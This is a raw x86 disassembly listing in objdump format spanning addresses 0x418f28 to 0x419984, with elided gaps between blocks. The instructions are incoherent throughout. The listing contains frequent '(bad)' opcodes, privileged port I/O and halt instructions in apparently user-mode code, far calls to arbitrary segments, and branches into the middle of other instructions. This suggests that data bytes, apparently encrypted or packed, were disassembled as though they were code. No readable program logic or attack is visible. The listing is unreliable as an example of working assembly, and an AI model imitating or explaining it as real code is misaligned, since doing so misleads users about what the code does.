  418f28:	lds    eax,FWORD PTR [ecx]
  418f2a:	cli    
  418f2b:	cmp    esi,DWORD PTR ss:[ecx]
  418f2e:	or     ecx,DWORD PTR [esi+0x9c06470]
  418f34:	idiv   BYTE PTR [edx]
  418f36:	push   cs
  418f37:	retf   0x76fd
  418f3a:	xor    bh,BYTE PTR [ecx+0x5a]
  418f3d:	int3   
  418f3e:	add    BYTE PTR [edx+edi*1-0x43],bl
  418f42:	jmp    0x418ec9
  418f44:	push   0xf3f01d6f
  418f49:	mov    bl,0x5f
  418f4b:	stc    
  418f4c:	mov    ebx,0x16d2fbbd
  418f51:	repnz loopne 0x418f7c
  418f54:	pushf  
  418f55:	jns    0x418fb4
  418f57:	ret    0x3340
  418f5a:	mov    ds:0xa43384cc,eax
  418f5f:	add    dh,bl
  418f61:	loope  0x418f33
  418f63:	or     DWORD PTR cs:0xa5c467ae,esp
  418f6a:	std    
  418f6b:	and    BYTE PTR [eax-0x28],dl
  418f6e:	aad    0xc6
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	xchg   ecx,eax
  418f72:	(bad)  
  418f73:	stos   DWORD PTR es:[edi],eax
  418f74:	mov    eax,ds:0xa6b8a564
  418f79:	mov    edx,0x4af83747
  418f7e:	cmp    dl,BYTE PTR [ebp+ebx*1-0x46]
  418f82:	xor    BYTE PTR [eax+ebx*2],ah
  418f85:	adc    BYTE PTR [eax-0x6b252e75],dl
  418f8b:	(bad)  
  418f8c:	mov    edi,0xf16ed5
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x23eaf1a7]
  419001:	(bad)
  419004:	mov    ah,0x8
  419006:	add    DWORD PTR [eax],eax
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	int3   
  41900d:	jmp    0xae2a:0xb1906171
  419014:	scas   al,BYTE PTR es:[edi]
  419015:	mov    esp,0xa53c26f
  41901a:	dec    ebp
  41901b:	loop   0x419019
  41901d:	stos   DWORD PTR es:[edi],eax
  41901e:	mov    dh,0xd2
  419020:	push   ds
  419021:	pop    edi
  419022:	cmp    DWORD PTR [edi+0x36],edx
  419025:	cmc    
  419026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419027:	inc    esp
  419028:	(bad)  
  419029:	sbb    DWORD PTR [ebx+0x6e0eed7e],edx
  41902f:	ins    DWORD PTR es:[edi],dx
  419030:	add    DWORD PTR [ebx-0x20],eax
  419033:	xor    BYTE PTR [ebx],ch
  419035:	call   0xcfc2:0xb626650
  41903c:	test   BYTE PTR [edi+0x642445e0],bl
  419042:	lods   eax,DWORD PTR ds:[esi]
  419043:	jp     0x419065
  419045:	xor    bl,0xa
  419048:	fs in  eax,dx
  41904a:	push   eax
  41904b:	pusha  
  41904c:	ret    0xb742
  41904f:	sub    BYTE PTR [eax],0xd0
  419052:	hlt    
  419053:	sub    al,0x63
  419055:	mov    esp,0x6f09374d
  41905a:	out    dx,al
  41905b:	jnp    0x418fe0
  41905d:	nop
  41905e:	or     ecx,DWORD PTR [edi]
  419060:	data16 aad 0x8
  419063:	aad    0x3d
  419065:	sub    DWORD PTR [edi+0x757018a2],ebp
  41906b:	push   edi
  41906c:	stc    
  41906d:	(bad)  
  41906e:	mov    ch,0x8
  419070:	pop    es
  419071:	or     edx,DWORD PTR [esi-0x5e]
  419074:	bound  ecx,QWORD PTR [edi]
  419076:	jmp    0x4190c2
  419078:	cs in  al,dx
  41907a:	(bad)  
  41907b:	dec    esi
  41907c:	retf   
  41907d:	scas   eax,DWORD PTR es:[edi]
  41907e:	stc    
  41907f:	ins    BYTE PTR es:[edi],dx
  419080:	test   eax,0x294e2d2f
  419085:	xor    DWORD PTR ds:0xf5659c0f,eax
  41908b:	imul   dh
  41908d:	clc    
  41908e:	and    al,0x5c
  419090:	add    DWORD PTR [esi+0x48],0xffffffbd
  419094:	jl     0x41908c
  419096:	(bad)  
  419097:	fistp  WORD PTR [ebp-0x12]
  41909a:	scas   al,BYTE PTR es:[edi]
  41909b:	aam    0x95
  41909d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41909e:	mov    ds:0x18628c6d,al
  4190a3:	faddp  st(7),st
  4190a5:	add    DWORD PTR [edi-0x336d6189],0xffffffbb
  4190ac:	fs inc ebx
  4190ae:	mov    bh,0xf8
  4190b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190b2:	lahf   
  4190b3:	adc    eax,0x8b38a219
  4190b8:	mov    ds:0x4f9510fd,eax
  4190bd:	inc    ebp
  4190be:	cld    
  4190bf:	jge    0x4190e5
  4190c1:	jmp    0xb06fc3c4
  4190c6:	push   ss
  4190c7:	int    0x92
  4190c9:	ds (bad) 
  4190cb:	lea    esi,[esi]
  4190cd:	push   0xffffffc0
  4190cf:	push   ebp
  4190d0:	into   
  4190d1:	add    dl,bl
  4190d3:	or     al,0x7d
  4190d6:	mov    dl,bh
  4190d8:	cmp    dl,BYTE PTR [esi-0x4e]
  4190db:	adc    al,0x4d
  4190dd:	pop    esi
  4190de:	jecxz  0x419068
  4190e0:	mov    al,BYTE PTR [edx+0x69]
  4190e3:	test   DWORD PTR [ebx],edx
  4190e5:	dec    ebx
  4190e6:	xchg   ecx,eax
  4190e7:	xchg   ebp,eax
  4190e8:	jne    0x419152
  4190ea:	das    
  4190eb:	xchg   ebp,eax
  4190ec:	sub    DWORD PTR [ebx+0x36c9fae5],0xffffffc8
  4190f3:	push   edi
  4190f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190f5:	push   0x59db10d9
  4190fa:	adc    al,0xb1
  4190fc:	jle    0x4190f4
  4190fe:	retf   
  4190ff:	fidivr DWORD PTR [ebp+0x5]
  419102:	inc    esi
  419103:	mov    ebx,0x5aabc0b9
  419108:	mov    eax,esi
  41910a:	jbe    0x4190fa
  41910c:	xchg   ebp,eax
  41910d:	jne    0x41916a
  41910f:	cdq    
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,BYTE PTR [ebx]
  419181:	dec    ecx
  419182:	dec    edi
  419183:	loop   0x41913d
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	push   eax
  41918d:	inc    ecx
  41918e:	fucom  st(3)
  419190:	out    dx,al
  419191:	test   eax,0x8e9c7fd
  419196:	sti    
  419197:	loopne 0x41918d
  419199:	retf   
  41919a:	sub    eax,0xa3c879f9
  41919f:	push   eax
  4191a0:	add    bh,BYTE PTR [ecx+0x3000ad53]
  4191a6:	fs push 0x32326413
  4191ac:	dec    ecx
  4191ad:	scas   al,BYTE PTR es:[edi]
  4191ae:	int3   
  4191af:	add    cl,BYTE PTR [edi*2-0x49764ca0]
  4191b6:	(bad)  
  4191b7:	mov    ebx,0xe1be6e80
  4191bc:	lods   eax,DWORD PTR ds:[esi]
  4191bd:	jle    0x4191c9
  4191bf:	scas   al,BYTE PTR es:[edi]
  4191c0:	ja     0x41921d
  4191c2:	add    dh,ch
  4191c4:	ret    0xa36d
  4191c7:	xchg   esi,eax
  4191c8:	neg    DWORD PTR [ecx+0x2f591377]
  4191ce:	jne    0x419192
  4191d0:	dec    edi
  4191d1:	fimul  DWORD PTR [ecx]
  4191d3:	ret    
  4191d4:	repz cmp eax,0x737ccbf1
  4191da:	xchg   edi,eax
  4191db:	pop    ss
  4191dc:	push   es
  4191dd:	fist   DWORD PTR [esi-0x49ef8dcd]
  4191e3:	ins    DWORD PTR es:[edi],dx
  4191e4:	inc    edx
  4191e5:	xchg   edi,eax
  4191e6:	xor    bl,BYTE PTR [ebp-0x4c]
  4191e9:	and    eax,DWORD PTR [edx+0x4dd1e459]
  4191ef:	inc    esi
  4191f0:	cmp    DWORD PTR [ebx],edx
  4191f2:	arpl   WORD PTR [ebx-0x6e785058],cx
  4191f8:	fwait
  4191f9:	and    DWORD PTR [edi],edx
  4191fb:	dec    esi
  4191fc:	call   0xf62f:0x5c3c15f8
  419203:	jecxz  0x4191e6
  419205:	ror    al,cl
  419207:	push   ss
  419208:	pop    ss
  419209:	cmc    
  41920a:	cs inc ebp
  41920c:	xor    BYTE PTR [ebx-0x42],0xb4
  419210:	add    al,BYTE PTR [ecx-0x6fa108b0]
  419216:	dec    edx
  419217:	test   BYTE PTR [edi],cl
  419219:	xor    edx,DWORD PTR [eax]
  41921b:	outs   dx,DWORD PTR ds:[esi]
  41921c:	adc    edi,DWORD PTR [edx+0x58]
  41921f:	mov    edi,0xad1d7821
  419224:	test   BYTE PTR [esp+edi*4-0x4f6da720],dh
  41922b:	retf   
  41922c:	aam    0xfb
  41922e:	je     0x4191ff
  419230:	dec    edx
  419231:	gs inc eax
  419233:	pop    ebp
  419234:	repz cmp al,0x9f
  419237:	or     BYTE PTR [esi+eiz*4-0x6dec3ab2],ch
  41923e:	add    ebp,DWORD PTR [esi+0x2c]
  419241:	and    ah,BYTE PTR [edx-0x623bd4ee]
  419247:	push   ss
  419248:	xor    al,0xd3
  41924a:	(bad)  
  41924b:	mov    eax,0x480f8ae6
  419250:	mov    dh,BYTE PTR [ebp-0x2a]
  419253:	out    0x2a,al
  419255:	icebp  
  419256:	ja     0x419271
  419258:	mov    ebp,0xb1688205
  41925d:	mov    eax,ds:0x764d731
  419262:	iret   
  419263:	cmp    eax,0x4ed0fb56
  419268:	fcom   QWORD PTR [esi]
  41926a:	dec    edi
  41926b:	out    0x66,eax
  41926d:	pop    es
  41926e:	mov    ah,0xe4
  419270:	cmp    DWORD PTR [ebx-0x5124fe1e],ebx
  419276:	pop    ebp
  419278:	and    eax,0x82985606
  41927d:	fs mov ah,0xcd
  419280:	push   cs
  419281:	inc    edi
  419282:	push   ss
  419283:	mov    eax,DWORD PTR [ebp+0x1e1aa9ae]
  419289:	out    dx,eax
  41928a:	test   eax,0x42a1ddfa
  41928f:	retf   0x0
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	es add al,0x99
  419303:	xchg   edx,eax
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [esi],al
  41930d:	mov    cl,BYTE PTR [ebx+edx*8]
  419310:	lock pop ds
  419312:	mov    ah,0xa9
  419314:	dec    edi
  419315:	ret    0xe9f4
  419318:	push   edi
  419319:	mov    ds:0xad7dcbc4,eax
  41931e:	data16 jmp 0x41932e
  419321:	jmp    FWORD PTR [ecx]
  419323:	lds    edx,FWORD PTR [edx-0x6bc1b61f]
  419329:	sti    
  41932a:	jns    0x419320
  41932c:	add    dh,bl
  41932e:	pop    ebp
  41932f:	daa    
  419330:	and    al,0x13
  419332:	mov    esp,0x8b82a474
  419337:	or     al,0x33
  419339:	xor    eax,DWORD PTR [esi]
  41933b:	loope  0x419375
  41933d:	jb     0x419344
  41933f:	cmp    ebp,DWORD PTR ds:0x8797630a
  419345:	cmp    esp,edi
  419347:	sar    BYTE PTR [eax*1+0x167703f4],cl
  41934e:	add    ebp,esp
  419350:	imul   ebx,DWORD PTR [ecx-0x20],0xb
  419354:	adc    ecx,DWORD PTR [ebp+0x2d8ed41d]
  41935a:	jno    0x4193d9
  41935c:	push   eax
  41935d:	ds mov DWORD PTR fs:0x1d47d9fc,edi
  419365:	push   es
  419366:	hlt    
  419367:	stos   BYTE PTR es:[edi],al
  419368:	pop    edx
  419369:	scas   eax,DWORD PTR es:[edi]
  41936a:	jle    0x4193b7
  41936c:	scas   al,BYTE PTR es:[edi]
  41936d:	lea    ebx,[ebp-0x28]
  419370:	scas   eax,DWORD PTR es:[edi]
  419371:	scas   al,BYTE PTR es:[edi]
  419372:	adc    dl,BYTE PTR [edi+0x1e]
  419375:	lock sub eax,0x194346b
  41937b:	jle    0x419373
  41937d:	retf   
  41937e:	or     eax,0xd3dcc2ad
  419383:	sbb    DWORD PTR [edi+0x2],edx
  419386:	scas   al,BYTE PTR es:[edi]
  419387:	mov    ch,ah
  419389:	ss jp  0x419385
  41938c:	stc    
  41938d:	xchg   esp,eax
  41938e:	xor    dh,BYTE PTR [eax]
  419390:	std    
  419391:	test   bh,0xf0
  419394:	es and dh,al
  419397:	out    0x6a,al
  419399:	adc    edx,DWORD PTR [ebp-0x6c]
  41939c:	dec    ebp
  41939d:	mov    BYTE PTR [ebx-0x4e],cl
  4193a0:	dec    eax
  4193a1:	rcl    dh,cl
  4193a3:	ret    0xec5b
  4193a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a7:	mov    ecx,esp
  4193a9:	mov    ah,0xae
  4193ab:	cld    
  4193ac:	lahf   
  4193ad:	sbb    al,0x10
  4193af:	retf   
  4193b0:	push   ebx
  4193b1:	mov    bh,0xb2
  4193b3:	fs sub eax,0x9cce3b5b
  4193b9:	xor    al,0x9c
  4193bb:	fwait
  4193bc:	jl     0x419354
  4193be:	mov    ebx,0xf5b1c043
  4193c3:	xor    BYTE PTR [ebp-0x5c46aacf],cl
  4193c9:	push   0x7883ca79
  4193ce:	dec    esp
  4193cf:	pop    edi
  4193d0:	hlt    
  4193d1:	aaa    
  4193d2:	push   eax
  4193d3:	stos   DWORD PTR es:[edi],eax
  4193d4:	dec    ebx
  4193d5:	add    BYTE PTR [ecx],bl
  4193d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193d8:	pop    eax
  4193d9:	mov    ds:0xaa7e02a7,al
  4193de:	inc    esp
  4193df:	bnd jns 0x419439
  4193e2:	popf   
  4193e3:	ret    
  4193e4:	mov    al,0x1f
  4193e6:	loopne 0x41941b
  4193e8:	inc    edx
  4193e9:	jae    0x4193d7
  4193eb:	or     eax,0x64e5991e
  4193f0:	pop    ebp
  4193f1:	dec    ecx
  4193f2:	es (bad) 
  4193f4:	fild   WORD PTR [ebp-0x71]
  4193f7:	lods   eax,DWORD PTR ds:[esi]
  4193f8:	sub    DWORD PTR [ebx-0x14],esi
  4193fb:	mov    eax,ds:0xd4b51f37
  419400:	pusha  
  419401:	pop    eax
  419402:	(bad)  
  419403:	fisub  WORD PTR [edi-0x7fe8043]
  419409:	push   ds
  41940a:	xor    dl,ch
  41940c:	call   0x0:0x616f91
	...
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	cmp    eax,0xc0b05105
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	mov    ds:0x9cd16e64,al
  419491:	mov    esi,0x58f4191f
  419496:	(bad)
  41949a:	dec    edi
  41949b:	arpl   WORD PTR [edx],cx
  41949d:	push   cs
  41949e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41949f:	push   cs
  4194a0:	retf   
  4194a1:	cld    
  4194a2:	mov    cl,0x7d
  4194a4:	xor    eax,0xf7bde710
  4194a9:	cmp    bl,bl
  4194ab:	test   al,0x7
  4194ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194af:	fwait
  4194b0:	mov    dh,0x18
  4194b2:	inc    edx
  4194b3:	adc    DWORD PTR [ebp-0x50],0x5e
  4194b7:	stos   BYTE PTR es:[edi],al
  4194b8:	xchg   ecx,eax
  4194b9:	aaa    
  4194ba:	fisub  WORD PTR [ecx+0x67]
  4194bd:	int3   
  4194be:	jg     0x419488
  4194c0:	xchg   edi,eax
  4194c1:	push   es
  4194c2:	lds    esp,FWORD PTR [ebx+0x70]
  4194c5:	mov    al,0xa2
  4194c7:	stos   BYTE PTR es:[edi],al
  4194c8:	jne    0x4194ac
  4194ca:	xor    DWORD PTR [ebx],edx
  4194cc:	xchg   esi,eax
  4194cd:	dec    edx
  4194ce:	lods   eax,DWORD PTR ds:[esi]
  4194cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194d0:	jb     0x419476
  4194d2:	push   es
  4194d3:	inc    edx
  4194d4:	dec    ecx
  4194d5:	(bad)  
  4194d6:	dec    esp
  4194d7:	test   ebx,0x286f6d85
  4194dd:	aad    0xe0
  4194df:	div    DWORD PTR [esi-0x13]
  4194e2:	or     eax,0xf0743831
  4194e7:	(bad)  
  4194e8:	call   FWORD PTR [ebx+edi*2]
  4194eb:	xchg   edx,eax
  4194ec:	je     0x419542
  4194ee:	dec    ebx
  4194ef:	retf   0xc532
  4194f2:	sub    DWORD PTR [edi],edx
  4194f4:	mov    al,ds:0xff17626a
  4194f9:	enter  0x45b,0x64
  4194fd:	lods   al,BYTE PTR ds:[esi]
  4194fe:	stc    
  4194ff:	loope  0x419532
  419501:	sbb    al,0x34
  419503:	xchg   ebp,eax
  419504:	push   0x62f531da
  419509:	pop    edx
  41950a:	aad    0x10
  41950c:	mov    cl,0xf2
  41950e:	add    DWORD PTR [edx-0x48],ecx
  419511:	mov    ch,0xbc
  419513:	cmp    al,0x4d
  419515:	xor    al,0x2d
  419517:	ja     0x4194e0
  419519:	cmp    edi,DWORD PTR [eax-0x12f753f4]
  41951f:	add    BYTE PTR [esi-0x33],ch
  419522:	cld    
  419523:	outs   dx,BYTE PTR ds:[esi]
  419524:	xchg   esp,eax
  419525:	jns    0x4194da
  419527:	lock mov bl,0x55
  41952a:	mov    eax,0xb865cd9c
  41952f:	xor    ebx,0xc0ccb05f
  419535:	popf   
  419536:	shl    DWORD PTR [ebx+0x2230cdf5],cl
  41953c:	mov    al,0x42
  41953e:	std    
  41953f:	sub    al,0x5d
  419541:	xlat   BYTE PTR ds:[ebx]
  419542:	jle    0x419598
  419544:	xadd   WORD PTR [edx-0x2f],di
  419549:	call   0x907c7981
  41954e:	ins    BYTE PTR es:[edi],dx
  41954f:	and    DWORD PTR [ecx-0x57],0x79ab00e8
  419556:	in     al,dx
  419557:	inc    esp
  419558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419559:	repnz clc 
  41955b:	pop    es
  41955c:	aas    
  41955d:	jne    0x4194e8
  41955f:	into   
  419560:	rcr    BYTE PTR [edi],0x84
  419563:	sub    BYTE PTR [ebp+0x31bc43d3],0xa9
  41956a:	call   0x71d7:0x47806dc
  419571:	add    DWORD PTR [eax+0x71],edi
  419574:	or     DWORD PTR [ebp-0x5888e3de],esi
  41957a:	int    0x79
  41957c:	fs or  al,0x43
  41957f:	cmc    
  419580:	dec    eax
  419581:	sub    BYTE PTR [edi+0x11],ch
  419584:	cmp    eax,0xb1ef3c8
  419589:	in     eax,dx
  41958a:	mov    ecx,0x3d36c71f
  41958f:	add    BYTE PTR [eax],0x0
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	push   ss
  419601:	jbe    0x419618
  419603:	xchg   ebp,eax
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	je     0x41961e
  41960e:	add    BYTE PTR [eax],ch
  419610:	iret   
  419611:	add    eax,0xfb5fec1e
  419616:	jnp    0x4195b7
  419618:	fild   QWORD PTR [ebx-0x6e]
  41961b:	mov    eax,ds:0xeb5615a1
  419620:	ret    
  419621:	(bad)  
  419622:	repz ss ret 0x773e
  419627:	mov    al,0x3f
  419629:	pop    edx
  41962a:	aaa    
  41962b:	add    eax,DWORD PTR [edx]
  41962d:	dec    ecx
  41962e:	dec    ebx
  41962f:	mov    fs,esp
  419631:	sub    BYTE PTR [ecx-0x16],0x2c
  419635:	retf   
  419636:	or     esi,ebx
  419638:	test   eax,0x83677595
  41963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963e:	inc    eax
  41963f:	enter  0x79b1,0xa2
  419643:	(bad)  
  419645:	mov    ah,BYTE PTR [edi+0x76539d91]
  41964b:	push   esp
  41964c:	or     DWORD PTR [ebp+esi*8+0x1dd675ba],esp
  419653:	(bad)  
  419654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419655:	int3   
  419656:	pop    ecx
  419657:	loop   0x419647
  419659:	xor    al,0xc6
  41965b:	out    0xd7,al
  41965d:	push   ss
  41965e:	inc    ah
  419660:	jb     0x41968b
  419662:	add    al,0x58
  419664:	les    ecx,FWORD PTR [ebp+0x24]
  419667:	mov    eax,0xef318522
  41966c:	pop    ss
  41966d:	pushf  
  41966e:	mov    dh,0xed
  419670:	push   edi
  419671:	xlat   BYTE PTR ds:[ebx]
  419672:	mov    dh,BYTE PTR [esi+0x2]
  419675:	cmp    edi,edx
  419677:	imul   ebx
  419679:	lock pop edx
  41967b:	popa   
  41967c:	popf   
  41967d:	mov    ds:0x1880b1ab,al
  419682:	mov    WORD PTR [ebx-0x1a320a39],gs
  419688:	jecxz  0x41962a
  41968a:	and    cl,0xa5
  41968d:	mov    al,ds:0xa47258cc
  419692:	test   DWORD PTR [esi],edi
  419694:	into   
  419695:	mov    bl,0xa3
  419697:	xor    al,0x59
  419699:	sub    DWORD PTR [ebx+0x4573c553],0x6c
  4196a0:	sub    esp,DWORD PTR [esi-0x22]
  4196a3:	adc    eax,0xe835a789
  4196a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a9:	retf   
  4196aa:	mov    WORD PTR [edx],gs
  4196ac:	xor    eax,0x2f8bcbf7
  4196b1:	aaa    
  4196b2:	dec    esp
  4196b3:	aad    0xee
  4196b5:	scas   al,BYTE PTR es:[edi]
  4196b6:	xchg   edi,eax
  4196b7:	repnz stc 
  4196b9:	mov    esp,0x63ecb65b
  4196be:	mov    bl,0xa
  4196c0:	repnz fmul QWORD PTR [ebx+0x10]
  4196c4:	scas   eax,DWORD PTR es:[edi]
  4196c5:	sbb    al,BYTE PTR [ebp+0x67e285d6]
  4196cb:	xchg   esi,eax
  4196cc:	jbe    0x419685
  4196ce:	push   ebx
  4196cf:	and    DWORD PTR [esi+0x3ade25f4],0xffffffaf
  4196d6:	ret    
  4196d7:	sbb    ebp,ebx
  4196d9:	outs   dx,DWORD PTR cs:[esi]
  4196db:	pop    esp
  4196dc:	and    eax,DWORD PTR [edi]
  4196de:	mov    esp,DWORD PTR [esi]
  4196e0:	loope  0x41966b
  4196e2:	loope  0x419680
  4196e4:	into   
  4196e5:	adc    DWORD PTR [ecx+0x6e],0x78
  4196e9:	mov    bl,0xa2
  4196eb:	std    
  4196ec:	je     0x4196f4
  4196ee:	inc    esi
  4196ef:	jo     0x41973d
  4196f1:	mov    ds:0x6513abe3,al
  4196f6:	cmp    eax,0x5eed3d71
  4196fb:	in     al,dx
  4196fc:	out    dx,al
  4196fd:	and    eax,0x28d39699
  419702:	dec    esp
  419703:	loop   0x4196f0
  419705:	sbb    eax,0x51e1ca89
  41970a:	inc    edi
  41970b:	call   DWORD PTR [esi+0x48cd1c]
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x7a8dd0ae
  419781:	push   ebx
  419782:	jecxz  0x4197d8
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	inc    DWORD PTR [ebp-0x65da23af]
  419792:	xor    bl,bh
  419794:	mov    esp,0x6422f8ac
  419799:	scas   eax,DWORD PTR es:[edi]
  41979a:	pop    ss
  41979b:	enter  0xc6d8,0x72
  41979f:	ror    BYTE PTR [ebx+0x3d],cl
  4197a2:	rcl    DWORD PTR [ebp+0x6852a85c],1
  4197a8:	fs push es
  4197aa:	pop    ds
  4197ab:	in     eax,0x18
  4197ad:	add    DWORD PTR [eax+0x28],0xffffff85
  4197b1:	xchg   edi,eax
  4197b2:	icebp  
  4197b3:	mov    BYTE PTR [edx-0x42921167],dh
  4197b9:	dec    edi
  4197ba:	out    dx,eax
  4197bb:	bound  esp,QWORD PTR [eax+0x7cfad15]
  4197c1:	cmc    
  4197c2:	iret   
  4197c3:	idiv   BYTE PTR ds:0x7adc5ecb
  4197c9:	xor    cl,BYTE PTR [eax+0x11729db6]
  4197cf:	jns    0x4197c6
  4197d1:	pop    edx
  4197d2:	inc    ecx
  4197d3:	iret   
  4197d4:	das    
  4197d5:	xchg   edi,eax
  4197d6:	cld    
  4197d7:	popf   
  4197d8:	cmp    eax,DWORD PTR [di]
  4197db:	adc    al,0x8a
  4197dd:	xchg   BYTE PTR ds:0xe6fab138,bh
  4197e3:	xchg   ecx,eax
  4197e4:	hlt    
  4197e5:	xchg   edi,eax
  4197e6:	sahf   
  4197e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e8:	fnstsw WORD PTR [edx+0x1a]
  4197eb:	aaa    
  4197ec:	xor    ebx,DWORD PTR [esi+ebx*2]
  4197ef:	cld    
  4197f0:	push   es
  4197f1:	jmp    FWORD PTR [esp+eax*4+0x29d72b00]
  4197f8:	(bad)  
  4197f9:	pop    ecx
  4197fa:	stos   DWORD PTR es:[edi],eax
  4197fb:	jle    0x419862
  4197fd:	xor    eax,0xa3bd4bf0
  419802:	inc    edi
  419803:	(bad)  [edi-0x4c]
  419806:	retf   0x3762
  419809:	push   cs
  41980a:	xchg   edi,eax
  41980b:	adc    bh,dl
  41980d:	jne    0x41985a
  41980f:	cmp    eax,0xcf6aec4
  419814:	fnstenv [ecx-0x6fb44da1]
  41981a:	test   eax,0x7b9f9fa0
  41981f:	pop    ebp
  419820:	rcl    BYTE PTR [edx+0x3b],cl
  419823:	push   esi
  419824:	stos   DWORD PTR es:[edi],eax
  419825:	out    dx,al
  419826:	add    dl,BYTE PTR [eax]
  419828:	icebp  
  419829:	add    DWORD PTR [esi-0x7b7f12a7],edx
  41982f:	ficomp DWORD PTR [ecx+0x46]
  419832:	repz or al,0xc9
  419835:	retf   0x1ba0
  419838:	shld   DWORD PTR [ebp+ebp*8+0x31ef2e5f],ecx,cl
  419840:	inc    esi
  419841:	sbb    al,0x19
  419843:	pop    es
  419844:	cmp    BYTE PTR [ebp-0x4f2f6094],ah
  41984a:	scas   al,BYTE PTR es:[edi]
  41984b:	stos   BYTE PTR es:[edi],al
  41984c:	data16 je 0x419870
  41984f:	neg    DWORD PTR ds:0xa2695ba5
  419855:	call   0x1bb9cbdb
  41985a:	push   es
  41985b:	cmp    BYTE PTR [ebx+esi*2+0x280a62f4],bh
  419862:	adc    DWORD PTR [ebx-0x6020f331],eax
  419868:	adc    al,0xd7
  41986a:	je     0x4198a3
  41986c:	addr16 sub al,0xbb
  41986f:	mov    bl,0xdb
  419871:	iret   
  419872:	test   eax,0x116bcaed
  419877:	pop    eax
  419878:	mov    al,ds:0x4ab555af
  41987d:	test   DWORD PTR [eax-0x54fc4ed7],ebx
  419883:	jbe    0x41984c
  419885:	sbb    BYTE PTR [esp+ecx*8],ah
  419888:	shl    dl,0x97
  41988b:	jb     0x419832
  41988d:	add    ebp,DWORD PTR [ebp+0xcc]
	...
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fst    st(7)
  419901:	ror    DWORD PTR [ecx],1
  419903:	cmp    esp,ecx
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	shr    DWORD PTR [esi-0x2b],cl
  41990f:	(bad)  
  419910:	(bad)  
  419912:	shl    DWORD PTR [ecx],0xa5
  419915:	lea    ecx,[eax+0x34a36224]
  41991b:	in     al,dx
  41991c:	retf   
  41991d:	cmp    edx,eax
  41991f:	jo     0x4198ef
  419921:	fmul   QWORD PTR [ecx-0x3f]
  419924:	rcl    DWORD PTR [esi+0x3a30c14a],0x5e
  41992b:	out    0x68,al
  41992d:	test   BYTE PTR [esi+0x27],bh
  419930:	(bad)  
  419931:	out    dx,al
  419932:	ret    
  419933:	jns    0x4198cd
  419935:	adc    BYTE PTR [eax-0x6e],dh
  419938:	dec    DWORD PTR [esi-0x21e6db29]
  41993e:	sub    eax,0x3946615e
  419943:	les    ebp,FWORD PTR [ecx+ebx*8+0x69]
  419947:	or     esp,DWORD PTR [ebp-0xa]
  41994a:	mov    edi,DWORD PTR [ebx+0x4e060cc7]
  419950:	and    al,0xab
  419952:	cmp    eax,0xdf4e621
  419957:	ret    0xb4b4
  41995a:	aas    
  41995b:	iret   
  41995c:	imul   ch
  41995e:	inc    ebp
  41995f:	es dec esp
  419961:	push   edx
  419962:	mov    al,ds:0xdd0323cb
  419967:	daa    
  419968:	pop    edx
  419969:	xchg   esi,eax
  41996a:	add    eax,0x28b36c69
  41996f:	leave  
  419970:	sbb    ecx,esi
  419972:	or     BYTE PTR [ebp+0x7eeab846],0xe5
  419979:	ins    DWORD PTR es:[edi],dx
  41997a:	les    eax,FWORD PTR [edi-0x74]
  41997d:	adc    DWORD PTR [edi+0x4d6b5a84],edx
  419983:	pop    edx
  419984:	fld    TBYTE PTR [eax]
